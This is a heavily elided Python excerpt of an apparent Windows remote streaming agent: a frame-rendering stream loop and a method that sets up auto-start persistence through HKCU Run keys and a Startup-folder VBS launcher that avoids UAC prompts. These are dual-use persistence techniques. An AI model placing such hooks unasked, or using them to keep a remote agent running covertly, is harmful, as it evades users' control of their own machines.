...
class AgentClient:
    ...
    async def _stream_loop(self, ws):
        ...
        while self.is_streaming:
            try:
                ...
                frame_bytes = await loop.run_in_executor(None, self.compositor.render_frame)
                if frame_bytes:
    ...
    def _ensure_persistence(self):
        ...
        try:
            ...
            # Direct .exe in HKLM Run triggers UAC elevation prompt on user logon!
            try:
                subprocess.run([
                    "reg", "delete",
            ...
            # ── Step 3: Current User Startup Folder (VBS with RunAsInvoker)
            vbs_path = None
            try:
            ...
            try:
                ...
                winreg.CloseKey(k)
                logger.info("[Persistence] HKCU Run key registered successfully.")
